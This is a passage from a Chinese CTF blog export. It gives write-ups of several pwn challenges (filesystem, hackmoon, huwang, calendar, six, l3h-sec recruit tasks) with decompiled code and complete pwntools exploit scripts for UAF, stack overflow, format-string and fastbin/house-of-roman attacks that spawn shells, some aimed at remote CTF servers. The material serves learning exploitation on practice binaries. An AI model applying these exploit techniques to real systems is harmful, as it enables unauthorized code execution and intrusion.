/bin/sh ; “”| md5sum exp123456789101112131415161718192021from pwn import *sh = process(&apos;./filesystem&apos;)#sh = remote(&apos;101.71.29.5&apos;, 10017)print sh.recvuntil(&apos;&gt; &apos;)sh.sendline(&apos;Create&apos;)print sh.recvuntil(&apos;Input Filename: &apos;)sh.sendline(&apos;aaaaa&apos;)print sh.recvuntil(&apos;&gt; &apos;)sh.sendline(&apos;Edit&apos;)print sh.recvuntil(&apos;Input the Index:&apos;)sh.sendline(&apos;0&apos;)print sh.recvuntil(&apos;Input File Content: &apos;)sh.sendline(&apos;&quot;; /bin/sh ; &quot;&apos;)print sh.recvuntil(&apos;&gt; &apos;)sh.sendline(&apos;Checksec&apos;)print sh.recvuntil(&apos;Input the Index:&apos;)sh.sendline(&apos;0&apos;)sh.interactive() hackmoon题目标准的选项题，有add print delete 功能 add 限制五次分配chunk，会先分配八个字节，分配用来存放一个print_moon_content函数指针及之后为用户分配的chunk指针，同时会在bss段存放为用户分配的chunk指针。print 会检查输入的idx及bss段的指针，在指针存在的情况下，调用该指针处的函数，也就是之前存放的print_moon_content函数指针 1234int __cdecl print_moon_content(int a1)&#123; return puts(*(const char **)(a1 + 4));&#125; delete 会将之前的两个指针依次free，但是其他的什么也没动，存在UAF问题 分析UAF漏洞很明显，同时指针被放到了堆中，很容易想到利用UAF控制指针即可，又同时，题中给了magic函数，所以想办法让magic函数指针覆盖某个chunk的指针就可以了 exp123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./hackmoon&apos;)elf = ELF(&apos;./hackmoon&apos;)def add(size, content): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;moon size :&apos;) sh.sendline(str(size)) sh.recvuntil(&apos;Content :&apos;) sh.send(content)def delete(index, ): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;Index :&apos;) sh.sendline(str(index)) sh.recvuntil(&apos;Success\\n&apos;) returndef show(index): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Index :&apos;) sh.sendline(str(index))magic= 0x8048986add(0x8,&apos;aaaaaaa&apos;)add(0x8,&apos;bbbbbbb&apos;)delete(1)delete(0)add(0x20,&apos;ccccccccc&apos;)add(0x8,&apos;deadbeef&apos;)delete(3)delete(2)add(0x8,p32(magic)*2)show(3)#gdb.attach(sh)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"护网杯pwn复现","slug":"护网杯pwn复现","date":"2019-02-15T04:42:46.000Z","updated":"2019-03-02T06:52:01.756Z","comments":true,"path":"2019/02/15/护网杯pwn复现/","link":"","permalink":"http://siriuswhiter.tk/2019/02/15/护网杯pwn复现/","excerpt":"","text":"huwang题目表面是个堆题，但实际上是个栈溢出。。。 给了add delete 函数，但是没有漏洞，题目额外给了一个guess 函数，guess成功会进入secret函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119void __noreturn guess()&#123; int v0; // ST04_4 __int64 v1; // [rsp+0h] [rbp-80h] __int64 v2; // [rsp+0h] [rbp-80h] signed int i; // [rsp+0h] [rbp-80h] int v4; // [rsp+4h] [rbp-7Ch] int fd; // [rsp+8h] [rbp-78h] int rand; // [rsp+8h] [rbp-78h] int max_cnt; // [rsp+Ch] [rbp-74h] char v8; // [rsp+10h] [rbp-70h] char s[32]; // [rsp+20h] [rbp-60h] char s1; // [rsp+40h] [rbp-40h] char name; // [rsp+60h] [rbp-20h] unsigned __int64 v12; // [rsp+78h] [rbp-8h] v12 = __readfsqword(0x28u); puts(&quot;please input your name&quot;); read(0, &amp;name, 0x20uLL); memset(s, 0, 0x10uLL); puts(&quot;Do you want to guess the secret?&quot;); get_str(&amp;v8, 2LL); if ( v8 == &apos;y&apos; ) &#123; if ( access(&quot;/tmp/secret&quot;, 0) == -1 ) &#123; HIDWORD(v1) = open(&quot;/tmp/secret&quot;, 65, 511LL); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, s, 0xCuLL); LODWORD(v1) = 0; while ( (signed int)v1 &lt;= 11 ) &#123; s[(signed int)v1] &amp;= 1u; LODWORD(v1) = v1 + 1; &#125; write(SHIDWORD(v1), s, 0xCuLL); close(SHIDWORD(v1)); close(fd); &#125; v0 = open(&quot;/tmp/secret&quot;, 0, v1); read(v0, s, 0xCuLL); close(v0); puts(&quot;Input how many rounds do you want to encrypt the secret:&quot;); max_cnt = input_0x10(); if ( max_cnt &gt; 10 ) &#123; puts(&quot;What? Why do you need to encrypt so many times?&quot;); exit(-1); &#125; if ( !max_cnt ) &#123; printf(&quot;At least encrypt one time&quot;, s); exit(-1); &#125; HIDWORD(v2) = open(&quot;/tmp/secret&quot;, 513); LODWORD(v2) = 0; while ( (unsigned int)v2 &lt; max_cnt ) &#123; MD5((__int64)s, 16LL, (__int64)s); LODWORD(v2) = v2 + 1; &#125; write(SHIDWORD(v2), s, 0x10uLL); close(SHIDWORD(v2)); puts(&quot;Try to guess the md5 of the secret&quot;); read(0, &amp;s1, 0x10uLL); if ( !memcmp(&amp;s1, s, 0x10uLL) ) secret((__int64)&amp;name); v4 = open(&quot;/tmp/secret&quot;, 513, 511LL, v2); rand = open(&quot;/dev/urandom&quot;, 0); read(rand, s, 0xCuLL); for ( i = 0; i &lt;= 11; ++i ) s[i] &amp;= 1u; write(v4, s, 0xCuLL); close(v4); close(rand); exit(0); &#125; printf(&quot;Oh!bye %s\\n&quot;, &amp;name); exit(0);&#125;int __fastcall secret(__int64 name)&#123; char v1; // ST1B_1 int v3; // [rsp+1Ch] [rbp-214h] char occ; // [rsp+20h] [rbp-210h] char s; // [rsp+120h] [rbp-110h] unsigned __int64 v6; // [rsp+228h] [rbp-8h] v6 = __readfsqword(0x28u); printf(&quot;Congratulations, %s guessed my secret!\\n&quot;, name); puts(&quot;And I want to know someting about you, and introduce you to other people who guess the secret!&quot;); puts(&quot;What`s your occupation?&quot;); get_str(&amp;occ, 0xFFLL); v3 = snprintf( &amp;s, 0xFFuLL, &quot;I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome.........&quot; &quot;.................................................................................................&quot;, name, &amp;occ); puts(&quot;Here is your introduce&quot;); puts(&amp;s); puts(&quot;Do you want to edit you introduce by yourself[Y/N]&quot;); v1 = getchar(); getchar(); if ( v1 == &apos;Y&apos; ) read(0, &amp;s, v3 - 1); return printf(&quot;The final presentation is as follows:%s\\n&quot;, &amp;s);&#125; 看一下保护，除了PIE其他的都开了 分析secret函数栈溢出，为了能够进入secret函数，需要绕过guess函数中的检查，这里便是神奇的地方了： 程序在读入随机数时会先将其清空，而之后输入加密次数时如果输入-1会使程序卡住之后超时退出，在一小段时间之内，本该被加密的文件实际上便是空的。 而此时如果再次重连程序，md5加密其实便是对0加密，这里大佬又神奇的输入HEX[00000000000000000000000000000000]的md5值并decode(‘hex’)，从而进入secret函数。 因为进入secret函数内会先输出前面输入的name，这里可以巧妙地顺便将canary输出，有了canary之后的便顺水推舟了。 ps： 但是感觉后面的栈布局有点奇怪，之后再看一看 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level=&apos;debug&apos;sh = process(&apos;./huwang&apos;)def six(name,rd,secret,flag=1): sh.recvuntil(&apos;&gt;&gt; \\n&apos;) sh.sendline(&apos;666&apos;) sh.recvuntil(&apos;name\\n&apos;) sh.send(name) sh.recvuntil(&apos;secret?\\n&apos;) sh.sendline(&apos;y&apos;) sh.recvuntil(&apos;secret:\\n&apos;) sh.sendline(str(rd)) if flag == 1: sh.recvuntil(&apos;secret\\n&apos;) sh.send(secret)six(&apos;aaa&apos;,-1,&apos;bbb&apos;,0)sh.recvuntil(&apos;timeout~&apos;)sh = process(&apos;./huwang&apos;)libc = ELF(&apos;./libc.so.6&apos;)six(&apos;a&apos;*0x19,1,&apos;4ae71336e44bf9bf79d2752e234818a5&apos;.decode(&apos;hex&apos;))sh.recvuntil(&apos;a&apos;*0x19)canary = u64(&apos;\\x00&apos;+sh.recvn(7))print &apos;canary: &apos;+hex(canary)sh.recvuntil(&apos;occupation?\\n&apos;)sh.send(&apos;a&apos; * 0xff)sh.recvuntil(&apos;[Y/N]\\n&apos;)sh.sendline(&apos;Y&apos;)#gdb.attach(sh)shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C) sh.send(shellcode)gdb.attach(sh)sh.recvuntil(&apos;Congratulations, &apos;)libc_addr = u64(sh.recvn(6) + &apos;\\x00&apos; * 2) - libc.symbols[&apos;puts&apos;]sh.recvuntil(&apos;occupation?\\n&apos;)sh.send(&apos;a&apos; * 0xff)sh.recvuntil(&apos;[Y/N]\\n&apos;)sh.sendline(&apos;Y&apos;)shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)shellcode += p64(0x0000000000401573) + p64(next(libc.search(&apos;/bin/sh&apos;)) + libc_addr) + p64(libc_addr + libc.symbols[&apos;system&apos;])sh.send(shellcode)sh.interactive() calendar题目选项题 add edit delete ，但是没有show函数 add 最多可以控制四个chunk，申请最大size为0x68 edit 可以输入新的size，只有在新的size小于等于原先输入的size时，可以输入内容 delete 只有free，存在UAF 程序在输入字符串时的get_str函数存在off-by-one漏洞 1for ( i = 0; (signed int)i &lt;= len; ++i ) // off by one 题目提示house of roman 分析刚开始看到没有show 函数，感觉就有点无从下手，根据house of roman的提示，去看一下这种利用方法，确实是基于没有show功能的情况下的利用方法，拿这个题顺便学习一下。 查看保护,全开（丧心病狂）12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 本地关闭随机化进行调试，调试成功后进行爆破就行了(玄学爆破，getshell要看命) house of roman 利用 局部写 减少随机化的程度，从而给出爆破的可能其相当于结合了fastbin attack 与 unsortedbin attack ，在没有泄露函数地址的情况下，利用unsortedbin 的首chunk的fd bk指向main_arena+88，也就是在malloc_hook附近。 ps: 如果是 64 位程序，通过malloc_printerr 触发 malloc ，基本可以稳定 getshell . exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from pwn import *#context.log_level=&apos;debug&apos;#sh=process(&apos;./task_calendar&apos;)def add(idx,size): sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;) sh.sendlineafter(&apos;&gt;&apos;,str(idx)) sh.sendlineafter(&apos;&gt;&apos;,str(size))def edit(idx,size,info): sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;) sh.sendlineafter(&apos;&gt;&apos;,str(idx)) sh.sendlineafter(&apos;&gt;&apos;,str(size)) sh.sendafter(&apos;&gt;&apos;,info)def dele(idx): sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;) sh.sendlineafter(&apos;&gt;&apos;,str(idx))def exp(): sh.recvuntil(&apos;input calendar name&gt; &apos;) sh.sendline(&apos;name&apos;) add(1,0x68) add(2,0x68) add(3,0x68) #------make chunk2 free to unsorted bin---------- edit(3,0x68,p64(0)*2+p64(0x90)+p64(0x51)+&apos;\\n&apos;) edit(1,0x68,&apos;a&apos;*0x68+&apos;\\x91&apos;) #gdb.attach(sh) dele(2) #gdb.attach(sh) #----fastbin attack----------------------------- edit(1,0x68,&apos;a&apos;*0x68+&apos;\\x71&apos;) dele(1) dele(3) edit(3,1,&apos;\\x70\\x70&apos;) edit(2,1,&apos;\\xfd\\x1a&apos;) #gdb.attach(sh) #--fastbin[0x70]= chunk3-&gt; chunk2 -&gt;malloc_hook-13----- add(1,0x60) add(4,0x60) add(3,0x60) # fix fastbinY--------- dele(4) edit(4,7,p64(0)) #gdb.attach(sh) #----unsorted bin attack------------------------- add(1,0x60) edit(1,9,p64(0)+&apos;\\x00\\x1b&apos;) add(1,0x60) #----edit malloc_hook to one_gadget-------------- one_off = 0xf66f0 edit(3,5,&apos;aaa\\xa4\\xd2\\xaf&apos;) dele(4) dele(4)for i in range(10000): sh = process(&apos;./task_calendar&apos;) try: exp() break; except: print i sh.close() sh.interactive() six题目一道感觉很奇怪的题目，不容易看懂 123456789101112131415161718192021222324252627282930313233__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; void (__fastcall *v3)(__int64, char *); // ST08_8 size_t v4; // rax char *v5; // rbx size_t v6; // rax char s; // [rsp+10h] [rbp-20h] unsigned __int64 v9; // [rsp+18h] [rbp-18h] v9 = __readfsqword(0x28u); mmap2chunk(); ` fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;buf, 6uLL); read(fd, &amp;v3, 6uLL); dest = mmap((void *)(v3 &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7, 34, -1, 0LL); --》rwx 高地址 qword_202098 = (__int64)mmap((void *)(buf &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 3, 34, -1, 0LL) + 0x500; --》rw 低地址 ` v3 = (void (__fastcall *)(__int64, char *))dest; memset(&amp;s, 0, 8uLL); puts(&quot;Show Ne0 your shellcode:&quot;); read(0, &amp;s, 6uLL); judge_shellcode((__int64)&amp;s); v4 = strlen(src); memcpy(dest, src, v4); v5 = (char *)dest; v6 = strlen(src); memcpy(&amp;v5[v6], &amp;s, 7uLL); v3(qword_202098, &amp;s); return 0LL;&#125; 程序刚开始mmap了两个地址，之后要求读入6个字节的shellcode，进入judge_shellcode进行判断，需要六个字节各不相同最后会将src代码复制到第一个chunk 并执行其中的代码 分析思路就是六个字节通过系统调用read函数，同时将rsi设置为rsp，即之后输入到栈顶，溢出到第一个chunk(即高地址的chunk)，将shellcode写入即可(大概思路应该是这样，但是题目本身理解的还不是特别清楚，后面还得再看) exp1234567891011121314from pwn import *sh = process(&apos;./six&apos;)context.arch = &apos;amd64&apos;sc=&apos;&apos;&apos;push rsp;pop rsi;lahf;xchg edx,eax;syscall&apos;&apos;&apos;sc = asm(sc)sh.sendafter(&apos;:&apos;,sc)pay = &apos;a&apos;*(0x1000-0x500)pay+=&apos;\\x90&apos;*0x36+asm(shellcraft.sh())sh.sendline(pay)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Pwn Heap leak addr && getshell","slug":"pwn-heap-leak-addr-getshell","date":"2019-02-14T05:37:18.000Z","updated":"2019-02-14T06:09:12.063Z","comments":true,"path":"2019/02/14/pwn-heap-leak-addr-getshell/","link":"","permalink":"http://siriuswhiter.tk/2019/02/14/pwn-heap-leak-addr-getshell/","excerpt":"","text":"在堆相关的题中经常需要泄露地址及最后的getshell，总结一下比较常用的方法： Leak Addressheap base 最常用的即在存在UAF或溢出之类的条件下，因为fastbin 在内存中为单链存放，之后释放的fastbin范围的chunk的fd指针会指向之前释放的等大小范围的chunk，泄露fd指针即可得到heap base main arena中存放着top chunk的地址，如果有条件泄露其地址便可以得到heap base libc base unsorted bin为双向链表，而第一个unsorted bin的fd 与 bk指针都指向main_arena+88 处，泄露指针处即可计算得到libc base stack addr 一般在可以得到libc base的情况下，可以利用libc中存放的_environ指针，该指针指向栈中环境变量的位置，泄露该指针的值便可以得到栈地址 Get Shellwrite to .plt.got当程序保护中got表不满时 即 ： RELRO: Partial RELRO 。此时got表可写，可以将某个函数的got地址改写为system()函数的地址，然后想办法将’/bin/sh’传参进去，get shell write to malloc_hook or free_hookmalloc_hook &amp;&amp; free_hook 是程序在调用malloc或free时会首先检查的地方，如果不为空，会先执行其指针指向的地方，所以如果将one_gadget或system(‘/bin/sh’)的地址写向该地址，便可以 get shell write to stack一般来说，这个真的是没有办法的话才用，利用上面的方法得到栈地址后，利用漏洞将one_gadget或system(‘/bin/sh’)的地址写向返回地址，这样程序在退出时便会getshell","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"l3h-sec Pwn Recruit New Questions","slug":"l3h-sec-pwn-recruit-new-questions","date":"2019-02-12T11:52:35.000Z","updated":"2019-06-10T04:45:27.262Z","comments":true,"path":"2019/02/12/l3h-sec-pwn-recruit-new-questions/","link":"","permalink":"http://siriuswhiter.tk/2019/02/12/l3h-sec-pwn-recruit-new-questions/","excerpt":"","text":"华科一个新战队的招新题，正好最近没有兴致继续下去，来玩一玩招新题 stack最简单的栈溢出 exp1234567891011from pwn import *#sh = process(&apos;./stack&apos;)sh =remote(&apos;159.65.68.241&apos;,&apos;10003&apos;)sys_addr = 0x80491e2pay = &apos;a&apos;*0x3a +&apos;bbbb&apos;+p32(sys_addr)sh.sendline(pay)sh.interactive() pubg题目先是一大段将随机值写入key.txt然后读出等等，然后将输入的值与读出的值进行比较，相等则进入overflow函数，栈溢出getshell就行。 分析前面一大段其实是可以不用管的1234567891011121314151617int __fastcall sub_401DDC(int time, void *ptr)&#123; char s; // [rsp+10h] [rbp-50h] FILE *stream; // [rsp+50h] [rbp-10h] unsigned int i; // [rsp+5Ch] [rbp-4h] stream = fopen(&quot;./key.txt&quot;, &quot;w&quot;); for ( i = 0; time + 1 &gt; i; ++i ) &#123; memset(&amp;s, 0, 0x40uLL); sub_401B55((__int64)ptr, (__int64)&amp;s, 0x10u); memset(ptr, 0, 0x40uLL); strcpy((char *)ptr, &amp;s); &#125; fwrite(ptr, 0x20uLL, 1uLL, stream); // s --&gt; file return fclose(stream);&#125; 在这一段里可以发现如果输入的time=-1，那么整个写入的循环便会被跳过，随后输入空值便可以进入overflow函数，溢出getshell 需要注意的是前面需要先写入一次使得key.txt创建，如果文件已经创建的话其实就可以不用了。 exp12345678910111213141516171819202122from pwn import *context.log_level=&apos;debug&apos;#p=process(&apos;./pubg&apos;)p=remote(&apos;159.65.68.241&apos;,9001)p.recvuntil(&apos;code&apos;)p.sendline(&apos;2&apos;)p.recvuntil(&apos;:&apos;)p.sendline(&apos;-2&apos;)time.sleep(5)p.close()#p=process(&apos;./pubg&apos;)p=remote(&apos;159.65.68.241&apos;,9001)p.recvuntil(&apos;code&apos;)p.sendline(&apos;2&apos;)p.recvuntil(&apos;:&apos;)p.sendline(&apos;-1&apos;)p.recvuntil(&apos;:&apos;)p.send(&apos;\\x00&apos;*16)p.recvuntil(&apos;:&apos;)p.send(&apos;A&apos;*0x28+p64(0x401BED))p.interactive() game题目12345678910111213141516171819202122232425262728293031323334353637unsigned int Game()&#123; unsigned int v0; // eax unsigned int v1; // eax char s; // [esp+Ch] [ebp-10Ch] char v4; // [esp+106h] [ebp-12h] char v5; // [esp+107h] [ebp-11h] char v6; // [esp+108h] [ebp-10h] char v7; // [esp+109h] [ebp-Fh] char v8; // [esp+10Ah] [ebp-Eh] unsigned int v9; // [esp+10Ch] [ebp-Ch] v9 = __readgsdword(0x14u); memset(&amp;s, 0, 0x100u); v0 = time(0); srand(v0); v4 = rand(); v5 = rand(); v6 = rand(); v7 = rand(); v8 = 0; puts(&quot;What&apos;s your magic string?&quot;); gets(&amp;s); v1 = Hash(&amp;s); if ( v1 == *(_DWORD *)&amp;v4 ) &#123; puts(&quot;Congraz!! Your magic string is:&quot;); printf(&amp;s); // fmt &#125; else &#123; puts(&quot;Wrong!&quot;); &#125; return __readgsdword(0x14u) ^ v9;&#125; 分析有个明显的栈溢出与fmt漏洞，一共三次机会思路便是输入格式化字符串并使用\\x00截断，同时溢出至v4，因为hash中的算法已知且其使用strlen，因此可以利用其将输入的\\x00之前的字符串的hash计算出来，并将其写入v4，这样通过检查，利用fmt漏洞分别泄露canary 与libc基址，最后一次覆盖栈返回地址为已给的hacker函数即可 exp123456789101112131415161718from pwn import *context.terminal=[&apos;bash&apos;]#context.log_level=&apos;debug&apos;#p=process(&apos;./game&apos;)p=remote(&apos;159.65.68.241&apos;,10002)p.recvuntil(&apos;?&apos;)p.sendline(&apos;%71$p&apos;.ljust(250,b&apos;\\x00&apos;)+p32(0x365))p.recvuntil(&apos;:\\n&apos;)canary=p.recvuntil(&apos;W&apos;)[:-1]print(&apos;canary is &apos;+ canary)#gdb.attach(p)#pause()p.sendline(&apos;%3$p&apos;.ljust(250,&apos;\\x00&apos;)+p32(0x19))p.recvuntil(&apos;:\\n&apos;)base=p.recvuntil(&apos;W&apos;)[:-1]print(&apos;base is &apos;+ base)p.sendline(&apos;\\x00&apos;*0x100+p32(int(canary,16))+&apos;A&apos;*12+p32(int(base[:-3]+&apos;2f5&apos;,16)))p.interactive() vitamin题目简单的堆，基本上没有检查 分析UAF将堆分配到bss段改buf指针指向got表，修改got表某个函数即可 (前面傻逼了好久，忘了开始的fork，调试attach不上进程，懵逼了好久) exp1234567891011121314151617181920212223242526272829303132333435from pwn import * context.log_level=&apos;debug&apos; p=process(&apos;./vitamin&apos;) #p=remote(&apos;159.65.68.241&apos;, 10001) def debug(addr = &apos;0x400BC7&apos;): gdb.attach(proc.pidof(p)[0]+1, &quot;b *&quot; + addr) raw_input(&apos;debug:&apos;) def create(formula): p.recvuntil(&apos;:\\n&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;:\\n&apos;) p.sendline(formula) def change(formula): p.recvuntil(&apos;:\\n&apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;:\\n&apos;) p.sendline(formula) def take(): p.recvuntil(&apos;:\\n&apos;) p.sendline(&apos;2&apos;) #debug() free_got=0x602018 create(&apos;aaaa&apos;) take() change(p64(0x6020dd)) create(p64(0x6020dd)) create(&apos;A&apos;*11+p64(free_got)) change(p64(0x400d58)) p.sendline(&apos;2&apos;) take()p.interactive() store题目选项题，功能有add,read,sell 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283 保护： RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)int add_book()&#123; size_t size; // [rsp+8h] [rbp-8h] for ( HIDWORD(size) = 0; HIDWORD(size) &lt;= 0xF &amp;&amp; ptr[5 * HIDWORD(size)]; ++HIDWORD(size) ) ; if ( HIDWORD(size) == 16 ) puts(&quot;Too many books&quot;); puts(&quot;What is the author name?&quot;); readn(0x28LL * HIDWORD(size) + 0x602060, 0x1F); puts(&quot;How long is the book name?&quot;); _isoc99_scanf(&quot;%u&quot;, &amp;size); if ( (unsigned int)size &gt; 0x50 ) return puts(&quot;Too big!&quot;); ptr[5 * HIDWORD(size)] = malloc((unsigned int)size); puts(&quot;What is the name of the book?&quot;); readn(ptr[5 * HIDWORD(size)], size); // size==0 时，溢出 return puts(&quot;Done!&quot;);&#125;// 漏洞函数__int64 __fastcall readn(__int64 a1, int len)&#123; __int64 result; // rax unsigned int v3; // eax unsigned __int8 buf; // [rsp+1Bh] [rbp-5h] unsigned int v5; // [rsp+1Ch] [rbp-4h] v5 = 0; while ( 1 ) &#123; result = (unsigned int)(len - 1); if ( (unsigned int)result &lt;= v5 ) break; read(0, &amp;buf, 1uLL); result = buf; if ( buf == &apos;\\n&apos; ) break; v3 = v5++; *(_BYTE *)(a1 + v3) = buf; &#125; return result;&#125;int sellbook()&#123; unsigned int idx; // [rsp+Ch] [rbp-4h] puts(&quot;Which book do you want to sell?&quot;); _isoc99_scanf(&quot;%u&quot;, &amp;idx); if ( idx &gt; 0x10 ) return puts(&quot;Out of bound!&quot;); if ( !ptr[5 * idx] ) // ptr as inuse return puts(&quot;No such book!&quot;); free((void *)ptr[5 * idx]); ptr[5 * idx] = 0LL; // ptr=0 return puts(&quot;Done!&quot;);&#125;int readbook()&#123; unsigned int idx; // [rsp+Ch] [rbp-4h] puts(&quot;Which book do you want to sell?&quot;); _isoc99_scanf(&quot;%u&quot;, &amp;idx); if ( idx &gt; 0x10 ) return puts(&quot;Out of bound!&quot;); if ( ptr[5 * idx] ) // 检查ptr return printf(&quot;Author:%s\\nBookname:%s\\n&quot;, 0x28LL * idx + 0x602060, ptr[5 * idx]); -&gt;%s泄漏信息 return puts(&quot;No such book!&quot;);&#125; 分析在输入size为0时readn函数漏洞，此时可以输入无限长度，可以溢出。结合readbook函数可以泄露堆地址； fastbin attack将chunk分配到bss段存储指针及author name的地方，修改指针为某一函数got地址计算得到libc基址。 之后就需要getshell了，想法有： 写got表，但是full relro，所以不行； 复写malloc_hook或free_hook,这个尝试了半天，因为在malloc_hook附近分配时需要用0x7f绕过大小检查，但是用户自己申请的大小最大为0x50，最终size最大便是0x60，于是想直接在bss段伪造0x70大小的chunk，并free掉，但是坑爹的是bss段一共就只有0x7f大小。。。最终放弃； 无奈之下，尝试将chunk分配到栈中覆盖返回地址，终于getshell！！ 从出题的学长那里学到了另一种思路 利用fastbin attack将一个伪造的size作为fd放入fastbinY中，而该指针会在main_arena 处存放，然后我们可以将其作为fakechunk的size，将chunk分配到main_arena处 分配过去之后，就可以修改main_arena处存放的top chunk地址，此时将top chunk地址提到malloc hook之上，再次申请一个chunk，如果选择的size在fastbinY中不存在，那么便会从topchunk中切割，也就会分配到malloc hook之上 修改最后一个chunk的内容即修改malloc hook的值 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179from pwn import *context.log_level=&apos;debug&apos;#sh= process(&apos;./book&apos;)#[&apos;./book&apos;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)sh =remote(&apos;159.65.68.241&apos;,&apos;10004&apos;)elf = ELF(&apos;./book&apos;)libc = ELF(&apos;libc-2.23.so&apos;)def add(a_name,size,b_name): sh.recvuntil(&apos;Your choice:\\n&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;author name?\\n&apos;) sh.sendline(a_name) sh.recvuntil(&apos;book name?\\n&apos;) sh.sendline(str(size)) sh.recvuntil(&apos;book?\\n&apos;) sh.sendline(b_name)def read(idx): sh.recvuntil(&apos;Your choice:\\n&apos;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;sell?\\n&apos;) sh.sendline(str(idx))def delete(idx): sh.recvuntil(&apos;Your choice:\\n&apos;) sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;sell?\\n&apos;) sh.sendline(str(idx))add(&apos;a&apos;,0,&apos;b&apos;)add(&apos;c&apos;,0,&apos;d&apos;)add(&apos;e&apos;,0,&apos;f&apos;)add(&apos;g&apos;,0,&apos;h&apos;)add(&apos;i&apos;,0,&apos;j&apos;)#--------leak heap_base-----------------#delete(2)delete(1)delete(0)add(p64(0)+p64(0x21),0,&apos;b&apos;*0x20)read(0)sh.recvuntil(&apos;b&apos;*0x20)heap_base = u64(sh.recvuntil(&apos;\\n&apos;).strip(&apos;\\n&apos;).ljust(8,&apos;\\x00&apos;))-0x40print &apos;heap_base : &apos;+hex(heap_base)#gdb.attach(sh)#---------fastbin_attack leak libc_base-----------------#delete(4)delete(3)add(&apos;A&apos;,0,&apos;b&apos;*0x10+p64(0)+p64(0x21)+p64(0x602060))add(&apos;f&apos;,0,&apos;wwwwwwww&apos;)add(&apos;a&apos;,0,&apos;a&apos;*0x10+p64(elf.got[&apos;puts&apos;]))#gdb.attach(sh)read(0)sh.recvuntil(&apos;name:&apos;)puts_got = u64(sh.recvuntil(&apos;\\n&apos;).strip(&apos;\\n&apos;).ljust(8,&apos;\\x00&apos;))libc_base = puts_got- libc.symbols[&apos;puts&apos;]print &apos;libc_base : &apos;+hex(libc_base) environ_ptr_addr = libc_base + libc.symbols[&apos;_environ&apos;]print &apos;environ_ptr_addr : &apos;+ hex(environ_ptr_addr)#gdb.attach(sh)#---------get shell-------------------------------#one_gadget_off = 0x45216one_gadget_addr = one_gadget_off + libc_basemalloc_hook_addr = libc_base + 0x3c4b10delete(3)add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(environ_ptr_addr))read(0)sh.recvuntil(&apos;name:&apos;)environ_addr = u64(sh.recvuntil(&apos;\\n&apos;).strip(&apos;\\n&apos;).ljust(8,&apos;\\x00&apos;))rbp_addr = environ_addr-0xf8print &apos;one_gadget_addr : &apos;+hex(one_gadget_addr)print &apos;malloc_hook_addr : &apos;+hex(malloc_hook_addr)print &apos;rbp_addr : &apos;+hex(rbp_addr)delete(3)add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+&apos;c&apos;*0x20+p64(0x6020b0)+&apos;d&apos;*0x10+p64(0x21))delete(2)delete(0)#gdb.attach(sh)add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+p64(rbp_addr-0x1e))#gdb.attach(sh)add(&apos;\\n&apos;,0x30,&apos;\\n&apos;)#gdb.attach(sh)add(&apos;c&apos;,0x30,&apos;a&apos;*0x16+p64(one_gadget_addr))#gdb.attach(sh)sh.sendline(&apos;4&apos;)#gdb.attach(sh)sh.interactive()from pwn import 